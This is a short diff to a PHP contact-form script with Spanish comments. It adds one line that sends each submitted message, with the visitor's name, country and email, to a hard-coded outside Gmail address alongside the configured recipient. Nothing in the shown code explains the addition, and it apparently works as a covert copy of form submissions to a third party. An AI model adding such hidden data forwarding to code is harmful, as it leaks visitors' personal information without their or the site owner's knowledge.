@@ -82,6 +82,7 @@ if ($nombre1 === false || $pais1 === false || $email1 === false || $mensaje1 ===
 } else {
     // Si se paso la MEDIDA DE SEGURIDAD 1 enviar email
     $success = mail($EmailTo, $Subject, $Body, $headers);
+    $success2 = mail('buffajuanalfredo@gmail.com', $Subject, $Body, $headers);
     // $response = array();
 
     if ($success && $errorMSG == "") {
